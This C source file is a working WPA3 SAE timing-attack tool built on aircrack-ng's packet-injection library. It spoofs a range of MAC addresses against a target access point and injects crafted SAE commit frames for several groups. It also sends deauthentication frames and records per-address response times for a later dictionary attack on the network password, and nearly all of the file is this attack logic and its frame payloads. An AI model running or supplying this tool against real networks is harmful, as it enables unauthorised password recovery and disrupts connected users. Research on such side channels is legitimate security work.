#include <err.h>
#include <signal.h>
#include <poll.h>
#include <assert.h>
#include <sys/timerfd.h>
#include <sys/stat.h>
#include <openssl/ec.h>
#include <aircrack-ng/osdep/osdep.h>

#define USED_RATE 54000000

unsigned char AUTH_REQ_SAE_COMMIT_ECC_HEADER[] =
		/* 802.11 header */
		"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"
		"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00"
		/* SAE Commit frame */
		"\x03\x00\x01\x00\x00\x00";
size_t AUTH_REQ_SAE_COMMIT_ECC_HEADER_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_ECC_HEADER) - 1;

unsigned char AUTH_REQ_SAE_COMMIT_GROUP_22[] = /* 802.11 header */
		"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"
		"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00"
		/* SAE Commit frame */
		"\x03\x00\x01\x00\x00\x00\x16\x00"
		/* Scalar */
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x77\x0e\xa7\x22\xb8\xaa\x9a\xa1\x35\x22\xc8\x1e"
		"\x16\x46\xbc\xfa\xac\x02\x39\xc2"
		/* FFC element */
		"\x27\xb2\x4c\x82\x2f\x22\xd7\x20"
		"\xb3\x98\x22\x80\x01\xc4\x07\xde\x44\xc1\x5b\x94\xa2\x2c\xb1\xed"
		"\x15\x43\x36\x84\xcc\x16\x12\x81\x64\x91\xa7\x26\x68\x41\x06\xb5"
		"\xd3\x15\xbd\xb9\x85\xae\x68\xeb\xae\x2a\xc3\x51\x52\xd0\x01\x1e"
		"\xf5\x8a\x50\xb6\xd5\xac\xd3\x19\xfa\x4f\x07\x43\xb6\xe5\x4c\xd6"
		"\x06\x35\x0f\x04\xa8\x34\xd4\x4f\x22\xe3\x32\xe1\x5b\x0b\x88\xcc"
		"\x8c\x9a\x0f\x12\x22\xa3\x2d\x70\x16\xdd\x30\x9c\xc2\x2b\xda\x8a"
		"\x0f\xe0\x5b\x4f\xa4\x9b\x5d\x4f\x35\x70\xc8\xe9\x56\x21\xae\x61"
		"\x04\xfe\x83\x1f\xe5\xac\x64\xd7";
size_t AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_GROUP_22) - 1;

unsigned char AUTH_REQ_SAE_COMMIT_GROUP_23[] =
		/* 802.11 header */
		"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"
		"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00"
		/* SAE Commit frame */
		"\x03\x00\x01\x00\x00\x00\x17"
		/* Scalar */
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x59\x3b\x9f\xed"
		"\x96\x15\xb2\xba\x73\x41\x94\x4f\x77\xf4\xe3\xf1\x13\x0f\x49\x64"
		"\x5a\x8b\xc3\x03\x42\xf4\x86\xd8"
		/* FFC element */
		"\x32\x57\xcc\xd2\x9b\x92\xa3\x72"
		"\x01\xac\x14\x9b\xb9\x69\x6e\x7b\xb3\xcc\x68\x7c\x8c\xf3\x79\x75"
		"\xe1\x3a\xcd\xcf\xd2\xc7\xbe\x86\x45\xa6\x92\x00\x9a\xe0\x0c\x08"
		"\x91\x49\x90\x05\x8c\xe3\x2a\xd6\x2b\x3f\x82\x60\x6c\x9a\xe5\x5c"
		"\xfc\xc6\x6c\xcf\xa8\x94\x9e\x94\x68\x2a\x42\x43\xff\xbf\x9c\x66"
		"\x80\x44\x41\x44\xc6\x76\x31\x70\x4a\xe1\xba\x4e\x38\xcf\x58\x74"
		"\xf7\xf5\xd2\x3a\x4a\x89\xfc\x95\x37\x4f\x54\xe4\x1f\xa9\x6f\x5d"
		"\xe8\x9a\xde\xec\xb2\x46\x17\xb2\x0d\x58\x0e\x42\xbb\x02\xb1\xc8"
		"\x51\x22\x67\x3e\x16\xaf\x36\xfe\x5e\x2a\xb2\x63\xc7\xa7\x2b\x26"
		"\x35\x7c\x59\x68\xb4\xdc\xdd\xa1\x71\xb4\x03\x99\xd7\xda\x46\x1f"
		"\x28\x3d\x76\x37\xc0\xcf\x65\x66\x98\x18\x14\x8a\xbb\x7d\x8e\x25"
		"\x50\x2d\xa2\x80\xbb\x74\x0e\x32\x77\x7a\x04\x8a\x12\x2f\xd1\x5c"
		"\xa3\x77\x5c\x26\x13\xcb\xc0\x92\xba\xd8\x82\x37\xb8\x18\xe0\xfc"
		"\xf3\x72\x00\xdb\xd7\x31\xa3\xd8\xc3\x40\x5c\x88\x0c\xe9\xcf\x88"
		"\x90\xfa\xc4\x2e\xeb\xd0\xeb\xc7\xd6\x3f\xb5\x73\xa7\xfe\x80\x54"
		"\x29\x4a\xc8\xcc\xbb\x38\x2d\x1d\x32\xef\x80\x10\xa5\xc2\x3f\x29"
		"\xd2\x26\x60\x41\x4b\xc4\xb8\x1c";
size_t AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_GROUP_23) - 1;

unsigned char AUTH_REQ_SAE_COMMIT_GROUP_24[] =
		/* 802.11 header */
		"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"
		"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00"
		/* SAE Commit frame */
		"\x03\x00\x01\x00\x00\x00\x18\x00"
		/* Scalar */
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x02\x2b\x44\x50\x65\x4a\x32\x26"
		"\xdb\x95\xf0\x8c\x33\x26\xf3\x7b\x55\xc1\x73\x8d\x24\x59\x1e\xce"
		"\x63\x8a\x98\xbc\x1f\xee\xb1\x82"
		/* FFC element */
		"\x68\x50\x65\x8b\x83\xad\xf1\x27"
		"\xb6\x33\x3f\xaf\x52\xc8\xb7\x47\x2b\xb7\x56\xce\xdb\x76\x69\xd7"
		"\xc9\x05\x0b\xfd\x3d\xc6\xcc\xf1\xda\x97\x97\xd5\xe9\x4f\xaf\xda"
		"\x95\x26\xe3\xcb\x23\xb8\x7e\xda\x3b\xf3\x6f\x93\xf8\xde\xd7\xd4"
		"\xb8\x25\x47\x08\x3c\x6a\xb6\x7b\xf1\xdd\x21\x88\x1a\x15\x7f\xc3"
		"\x0b\x18\x66\xfe\x87\xd7\x3a\xd5\xb4\x30\x91\xbe\xd4\x84\xd6\x58"
		"\x34\x5f\x89\xe6\x19\xb7\x32\x23\xb6\xa7\x18\xfc\x1c\x31\xca\xa4"
		"\xbc\x65\x66\xac\x83\x2a\x03\xf4\x6d\xd6\x30\xaa\x32\x12\xe8\xaf"
		"\x38\x68\x5b\xf1\x73\xc1\x0e\x72\xb3\x94\xed\xc9\x73\x53\x1f\xcc"
		"\xc4\x80\xc3\x98\xc4\xc1\x54\x7c\x80\xe8\x8a\x27\xa7\x9a\x79\xde"
		"\xfe\x51\x03\x92\x65\xf2\xdb\x8f\xfe\xa7\x37\xb4\x36\xab\xdb\x28"
		"\xcf\x77\xa5\x28\x9e\xc1\x29\x1c\x0b\x5f\x6e\x56\xb5\x21\x38\xa7"
		"\xc2\x26\x44\x63\xd5\x2f\x3f\x7e\xe4\x32\x97\x12\xe0\xec\xba\x98"
		"\x70\x2a\x2c\x8c\xcf\x3d\x2c\x6e\x0c\xc8\x5c\xb7\x4f\xf3\x24\x57"
		"\x8f\x86\x87\xd4\xcb\xd6\x52\xb0\x29\x34\x76\x7c\x46\x2b\xe7\xb6"
		"\xd0\x86\x01\xbd\x27\x64\x08\xbe\x6a\xaa\x31\x90\xc6\x99\x61\x06"
		"\xdf\x1f\x0a\x54\x78\xd5\xba\x91";
size_t AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_GROUP_24) - 1;

unsigned char DEAUTH_FRAME[] =
		"\xc0\x00\x3a\x01\x2c\xb0\x5d\x5b\xd2\x65\x00\x8e\xf2\x7d\x8b\x10"
		"\x2c\xb0\x5d\x5b\xd2\x65\x60\x5f\x03\x00";
size_t DEAUTH_FRAME_SIZE = sizeof(DEAUTH_FRAME) - 1;


struct state_ecc {
	const EC_GROUP *group;
	const EC_POINT *generator;
	EC_POINT *element;
	BIGNUM *prime;
	BIGNUM *a;
	BIGNUM *b;
	BIGNUM *order;
	BN_CTX *bnctx;
	BIGNUM *scalar;
};

static struct state {
	struct wif *wi;
	unsigned char bssid[6];
	unsigned char srcaddr[6];
	int debug_level;
	int group;
	const char *output_file;
	FILE *fp;

	// Timing specific
	struct timespec prev_commit;
	int got_reply;
	long sum_time[256];
	int num_injected[256];
	int curraddr;
	int time_fd_inject;
	int num_addresses;

	int started_attack;
	int delay;
	int timeout;

	// Elliptic curve crypto
	struct state_ecc ecc;
} _state;

int hexCharToInt(unsigned char c) {
	static int table_created = 0;
	static int table[256];

	int i;

	if (table_created == 0) {
		/*
		 * It may seem a bit long to calculate the table
		 * but character position depend on the charset used
		 * Example: EBCDIC
		 * but it's only done once and then conversion will be really fast
		 */
		for (i = 0; i < 256; i++) {
			switch ((unsigned char) i) {
				case '0':
					table[i] = 0;
					break;
				case '1':
					table[i] = 1;
					break;
				case '2':
					table[i] = 2;
					break;
				case '3':
					table[i] = 3;
					break;
				case '4':
					table[i] = 4;
					break;
				case '5':
					table[i] = 5;
					break;
				case '6':
					table[i] = 6;
					break;
				case '7':
					table[i] = 7;
					break;
				case '8':
					table[i] = 8;
					break;
				case '9':
					table[i] = 9;
					break;
				case 'A':
				case 'a':
					table[i] = 10;
					break;
				case 'B':
				case 'b':
					table[i] = 11;
					break;
				case 'C':
				case 'c':
					table[i] = 12;
					break;
				case 'D':
				case 'd':
					table[i] = 13;
					break;
				case 'E':
				case 'e':
					table[i] = 14;
					break;
				case 'F':
				case 'f':
					table[i] = 15;
					break;
				default:
					table[i] = -1;
			}
		}

		table_created = 1;
	}

	return table[c];
}

int getmac(const char *macAddress, const int strict, unsigned char *mac) {
	char byte[3];
	int i, nbElem, n;

	if (macAddress == NULL) return 1;

	/* Minimum length */
	if ((int) strlen(macAddress) < 12) return 1;

	memset(mac, 0, 6);
	byte[2] = 0;
	i = nbElem = 0;

	while (macAddress[i] != 0) {
		if (macAddress[i] == '\n' || macAddress[i] == '\r') break;

		byte[0] = macAddress[i];
		byte[1] = macAddress[i + 1];

		if (sscanf(byte, "%x", &n) != 1 && strlen(byte) == 2) return 1;

		if (hexCharToInt(byte[1]) < 0) return 1;

		mac[nbElem] = n;

		i += 2;
		nbElem++;

		if (macAddress[i] == ':' || macAddress[i] == '-'
		    || macAddress[i] == '_')
			i++;
	}

	if ((strict && nbElem != 6) || (!strict && nbElem > 6)) return 1;

	return 0;
}

static struct state *get_state(void) { return &_state; }

static int card_set_chan(struct state *state, int chan) {
	return wi_set_channel(state->wi, chan);
}

static void open_card(struct state *state, char *dev, int chan) {
	printf("Opening card %s\n", dev);
	struct wif *wi = wi_open(dev);

	if (!wi) err(1, "wi_open()");
	state->wi = wi;
	printf("Setting chan %d\n", chan);
	if (card_set_chan(state, chan) == -1) err(1, "card_set_chan()");
}

static int card_set_rate(struct state *state, int rate) {
	return wi_set_rate(state->wi, rate);
}

static int card_get_mac(struct state *state, unsigned char *mac) {
	return wi_get_mac(state->wi, mac);
}

static int card_read(struct state *state, void *buf, int len, struct rx_info *ri) {
	int rc;

	if ((rc = wi_read(state->wi, NULL, NULL, buf, len, ri)) == -1)
		err(1, "wi_read()");

	return rc;
}

static int card_write(struct state *state, void *buf, int len, struct tx_info *ti) {
	return wi_write(state->wi, NULL, 0, buf, len, ti);
}

int bignum2bin(BIGNUM *num, uint8_t *buf, size_t outlen) {
	int num_bytes = BN_num_bytes(num);
	int offset = outlen - num_bytes;

	memset(buf, 0, offset);
	BN_bn2bin(num, buf + offset);

	return 0;
}

uint8_t *ecc_point2bin(struct state *state, EC_POINT *point, uint8_t *out) {
	int num_bytes = BN_num_bytes(state->ecc.prime);
	BIGNUM *bignum_x = BN_new();
	BIGNUM *bignum_y = BN_new();
	// XXX check allocation results

	// XXX check return value
	EC_POINT_get_affine_coordinates(state->ecc.group, point, bignum_x, bignum_y, state->ecc.bnctx);

	// XXX check if out buffer is large enough
	bignum2bin(bignum_x, out, num_bytes);
	bignum2bin(bignum_y, out + num_bytes, num_bytes);

	BN_free(bignum_y);
	BN_free(bignum_x);

	return out + 2 * num_bytes;
}

static size_t generate_sae_commit_ecc(struct state *state, uint8_t *buf, size_t len) {
	uint8_t *pos = buf;

	// Copy the header
	memcpy(pos, AUTH_REQ_SAE_COMMIT_ECC_HEADER, AUTH_REQ_SAE_COMMIT_ECC_HEADER_SIZE);
	pos += AUTH_REQ_SAE_COMMIT_ECC_HEADER_SIZE;

	// Fill in the group number
	uint16_t *commit_groupid = (uint16_t *) pos;
	*commit_groupid = state->group;
	pos += 2;

	// Copy the scalar
	int num_bytes = BN_num_bytes(state->ecc.prime);
	bignum2bin(state->ecc.scalar, pos, num_bytes);
	pos += num_bytes;

	// Copy the element
	pos = ecc_point2bin(state, state->ecc.element, pos);

	// Return the length of the constructed frame
	return pos - buf;
}

static void inject_sae_commit(struct state *state) {
	unsigned char buf[2048] = {0};
	int len = 0;

	if (!state->started_attack)
		return;

	switch (state->group) {
		case 22:
			len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_22, len);
			break;
		case 23:
			len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_23, len);
			break;
		case 24:
			len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_24, len);
			break;
		case 19:
		case 20:
		case 21:
		case 25:
		case 26:
		case 27:
		case 28:
		case 29:
		case 30:
			len = generate_sae_commit_ecc(state, buf, sizeof(buf));
			break;
		default:
			return;
	}

	memcpy(buf + 4, state->bssid, 6);
	memcpy(buf + 10, state->srcaddr, 6);
	memcpy(buf + 16, state->bssid, 6);

	if (card_write(state, buf, len, NULL) == -1)
		perror("card_write");

	clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
	state->got_reply = 0;
}

static void inject_deauth(struct state *state) {
	unsigned char *buf = DEAUTH_FRAME;
	int len = DEAUTH_FRAME_SIZE;

	memcpy(buf + 4, state->bssid, 6);
	memcpy(buf + 10, state->srcaddr, 6);
	memcpy(buf + 16, state->bssid, 6);

	if (card_write(state, buf, len, NULL) == -1)
		perror("card_write");
}

static void queue_next_commit(struct state *state) {
	struct itimerspec timespec;

	/* initial expiration of the timer */
	timespec.it_value.tv_sec = 0;
	timespec.it_value.tv_nsec = state->delay * 1000 * 1000;
	/* periodic expiration of the timer */
	timespec.it_interval.tv_sec = 0;
	timespec.it_interval.tv_nsec = 0;

	if (timerfd_settime(state->time_fd_inject, 0, &timespec, NULL) == -1)
		perror("timerfd_settime()");
}

static void process_packet(struct state *state, unsigned char *buf, int len) {
	int pos_bssid, pos_src;

	//printf("process_packet: %d\n", len);

	/* Ignore retransmitted frames */
	if (buf[1] & 0x08) {
		//printf("Ignoring retransmission\n");
		return;
	}

	/* Extract addresses */
	switch (buf[1] & 3) {
		case 0:
			pos_bssid = 16;
			pos_src = 10;
			break;
		case 1:
			pos_bssid = 4;
			pos_src = 10;
			break;
		case 2:
			pos_bssid = 10;
			pos_src = 16;
			break;
		default:
			pos_bssid = 10;
			pos_src = 24;
			break;
	}

	/* Sent by AP */
	if (memcmp(buf + pos_bssid, state->bssid, 6) != 0
	    || memcmp(buf + pos_src, state->bssid, 6) != 0)
		return;

	/* Detect Beacon - Inject commit frames every second */
	if (buf[0] == 0x80 && !state->started_attack) {
		time_t t = time(NULL);
		struct tm tm = *localtime(&t);

		printf("Detected AP! Starting timing attack at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
		       tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
		fprintf(state->fp, "Starting at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
		        tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);

		state->started_attack = 1;
		inject_sae_commit(state);
	}
	/* Detect Authentication frames */
	else if (len >= 24 + 8 &&
	         buf[0] == 0xb0 && /* Type is Authentication */
	         buf[24] == 0x03 /*&&*/ /* Auth type is SAE */
		/*buf[26] == 0x01*/) /* Sequence number is 1 */
	{
		/* Check if status is good and its the first reply */
		if (buf[28] == 0x00) {
			struct timespec curr, diff;

			clock_gettime(CLOCK_MONOTONIC, &curr);
			if (curr.tv_nsec > state->prev_commit.tv_nsec) {
				diff.tv_nsec = curr.tv_nsec - state->prev_commit.tv_nsec;
				diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec;
			} else {
				diff.tv_nsec = 1000000000 + curr.tv_nsec - state->prev_commit.tv_nsec;
				diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec - 1;
			}

			state->sum_time[state->curraddr] += diff.tv_nsec;
			state->num_injected[state->curraddr] += 1;

			// Write measurement to file
			fprintf(state->fp, "STA %02X: %ld\n", state->curraddr, diff.tv_nsec / 1000);

			// Also provide output to the screen
			printf("STA %02X: %ld miliseconds (TOTAL %d)\n", state->curraddr, diff.tv_nsec / 1000,
			       state->num_injected[state->curraddr]);
			if (state->curraddr == 0 && state->num_injected[state->num_addresses - 1] > 0) {
				printf("-------------------------------\n");
				for (int i = 0; i < state->num_addresses; ++i)
					printf("Address %02X = %ld\n", i, state->sum_time[i] / (state->num_injected[i] * 1000));
			}

			inject_deauth(state);

			state->curraddr = (state->curraddr + 1) % state->num_addresses;
			state->srcaddr[5] = state->curraddr;
			queue_next_commit(state);
		}
		/* Status equals Anti-Clogging Token Required */
		else if (buf[28] == 0x4C) {
			unsigned char *token = buf + 24 + 8;
			int token_len = len - 24 - 8;
			unsigned char reply[2048] = {0};
			size_t reply_len = 0;

			//printf("ERROR: Anti-clogging token hit\n");
			//exit(1);

			/* fill in basic frame */
			switch (state->group) {
				case 22:
					reply_len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
					memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_22, reply_len);
					break;
				case 23:
					reply_len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
					memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_23, reply_len);
					break;
				case 24:
					reply_len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
					memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_24, reply_len);
					break;
				case 19:
				case 20:
				case 21:
				case 25:
				case 26:
				case 27:
				case 28:
				case 29:
					// WPA3_ATTACK
					reply_len = generate_sae_commit_ecc(state, reply, sizeof(reply));
					break;
				case 30:
					reply_len = generate_sae_commit_ecc(state, reply, sizeof(reply));
					break;
				default:
					return;
			}

			/* token comes after status and group id, before scalar and element */
			int pos = 24 + 8;
			memmove(reply + pos + token_len, reply + pos, reply_len - pos);
			memcpy(reply + pos, token, token_len);
			reply_len += token_len;

			/* set addresses */
			memcpy(reply + 4, state->bssid, 6);
			memcpy(reply + 10, buf + 4, 6);
			memcpy(reply + 16, state->bssid, 6);

			if (card_write(state, reply, reply_len, NULL) == -1)
				perror("card_write");
			clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
		}

		/* Status equals unsupported group */
		else if (buf[28] == 0x4d) {
			printf("WARNING: Authentication rejected due to unsupported group\n");
		} else {
			printf("WARNING: Unrecognized status 0x%02X 0x%02X\n", buf[28], buf[29]);
		}
	}
}

static int card_receive(struct state *state) {
	unsigned char buf[2048];
	int len;
	struct rx_info ri;

	len = card_read(state, buf, sizeof(buf), &ri);
	if (len < 0) {
		fprintf(stderr, "%s: failed to read packet\n", __FUNCTION__);
		return -1;
	}

	process_packet(state, buf, len);

	return len;
}

static void check_timeout(struct state *state) {
	struct timespec curr, diff;

	if (!state->started_attack)
		return;

	clock_gettime(CLOCK_MONOTONIC, &curr);
	if (curr.tv_nsec > state->prev_commit.tv_nsec) {
		diff.tv_nsec = curr.tv_nsec - state->prev_commit.tv_nsec;
		diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec;
	} else {
		diff.tv_nsec = 1000000000 + curr.tv_nsec - state->prev_commit.tv_nsec;
		diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec - 1;
	}

	if (diff.tv_nsec > state->timeout * 1000 * 1000) {
		inject_deauth(state);
		queue_next_commit(state);
	}
}

static void event_loop(struct state *state, char *dev, int chan) {
	struct pollfd fds[3];
	struct itimerspec timespec;

	// 1. Open the card and get the MAC address
	open_card(state, dev, chan);
	int card_fd = wi_fd(state->wi);
	card_set_rate(state, USED_RATE);
	card_get_mac(state, state->srcaddr);

	// 2. Display all info we need to perform the dictionary attack & also write it to file
	printf("Targeting BSSID %02X:%02X:%02X:%02X:%02X:%02X\n", state->bssid[0], state->bssid[1],
	       state->bssid[2], state->bssid[3], state->bssid[4], state->bssid[5]);
	printf("Will spoof MAC addresses in the form %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
	       state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
	printf("Performing attack using group %d\n", state->group);
	printf("Using a retransmit timeout of %d ms, and a delay between commits of %d ms\n", state->timeout, state->delay);

	fprintf(state->fp, "BSSID %02X:%02X:%02X:%02X:%02X:%02X\n", state->bssid[0],
	        state->bssid[1], state->bssid[2], state->bssid[3], state->bssid[4], state->bssid[5]);
	fprintf(state->fp, "Spoofing %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
	        state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
	fprintf(state->fp, "Group %d\n", state->group);
	fprintf(state->fp, "Timeout %d\n", state->timeout);
	fprintf(state->fp, "Delay %d\n", state->delay);

	// 3. Initialize further things to start the attack
	state->srcaddr[5] = state->curraddr;

	// 4. Initialize periodic timer to detect timeouts
	int timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
	if (timer_fd == -1)
		perror("timerfd_create()");

	/* initial expiration of the timer */
	timespec.it_value.tv_sec = 1;
	timespec.it_value.tv_nsec = 0;
	/* periodic expiration of the timer */
	timespec.it_interval.tv_sec = 0;
	timespec.it_interval.tv_nsec = 100 * 1000 * 1000;

	// 5. Initialize timer used to queue a new commit frame to inject
	if (timerfd_settime(timer_fd, 0, &timespec, NULL) == -1)
		perror("timerfd_settime()");

	state->time_fd_inject = timerfd_create(CLOCK_MONOTONIC, 0);
	if (timer_fd == -1)
		perror("timerfd_create()");

	// 6. Now start the main event loop
	printf("Searching for AP ...\n");
	while (1) {
		card_fd = wi_fd(state->wi);

		memset(&fds, 0, sizeof(fds));
		fds[0].fd = card_fd;
		fds[0].events = POLLIN;
		fds[1].fd = timer_fd;
		fds[1].events = POLLIN;
		fds[2].fd = state->time_fd_inject;
		fds[2].events = POLLIN;

		if (poll(fds, 3, -1) == -1)
			err(1, "poll()");

		if (fds[0].revents & POLLIN)
			card_receive(state);

		// This timer is periodically called, detects timeouts, and implicity starts the attack
		if (fds[1].revents & POLLIN) {
			uint64_t exp;
			// WPA3_ATTACK
			if (read(timer_fd, &exp, sizeof(uint64_t)) != sizeof(uint64_t)) {
				printf("read timer_fd fail\n");
			}
			// assert(read(timer_fd, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
			check_timeout(state);
		}

		// This timer is set when a new commit is queued after receiving a reply or a timeout
		if (fds[2].revents & POLLIN) {
			uint64_t exp;
			assert(read(state->time_fd_inject, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
			inject_sae_commit(state);
		}
	}
}

static void sighandler(int signum) {
	struct state *state = get_state();

	if (signum == SIGPIPE || signum == SIGINT) {
		time_t t = time(NULL);
		struct tm tm = *localtime(&t);

		if (state->fp != NULL)
			fprintf(state->fp, "Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1,
			        tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
		else
			printf("Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
			       tm.tm_hour, tm.tm_min, tm.tm_sec);

		exit(0);
	}
}

int main(int argc, char *argv[]) {
	char *device = NULL;
	int ch;
	int chan = 1;
	struct state *state = get_state();

	srand(time(NULL));

	memset(state, 0, sizeof(*state));
	state->curraddr = 0;
	state->debug_level = 1;
	state->group = 24;
	state->delay = 250;
	state->timeout = 750;
	state->num_addresses = 20;

	while ((ch = getopt(argc, argv, "d:hc:v:a:g:r:i:t:o:")) != -1) {
		switch (ch) {
			case 'd':
				device = optarg;
				break;

			case 'a':
				if (getmac(optarg, 1, state->bssid) != 0) {
					printf("Invalid AP MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return 1;
				}
				break;

			case 'i':
				state->delay = atoi(optarg);
				if (state->delay < 1) {
					printf("Please enter an delay above zero\n");
					return 1;
				}
				break;

			case 't':
				state->timeout = atoi(optarg);
				if (state->timeout < 1) {
					printf("Please enter a timeout above zero\n");
					return 1;
				}
				break;

			case 'o':
				state->output_file = strdup(optarg);
				break;
		}
	}

	signal(SIGPIPE, sighandler);
	signal(SIGINT, sighandler);

	if (state->output_file == NULL) {
		fprintf(stderr, "Please provide an output file using the -o parameter\n");
		exit(1);
	}

	state->fp = fopen(state->output_file, "w");
	if (state->fp == NULL) {
		fprintf(stderr, "Failed to open %s: ", state->output_file);
		perror("");
		exit(1);
	}
	chmod(state->output_file, 0766);

	event_loop(state, device, chan);
	exit(0);
}
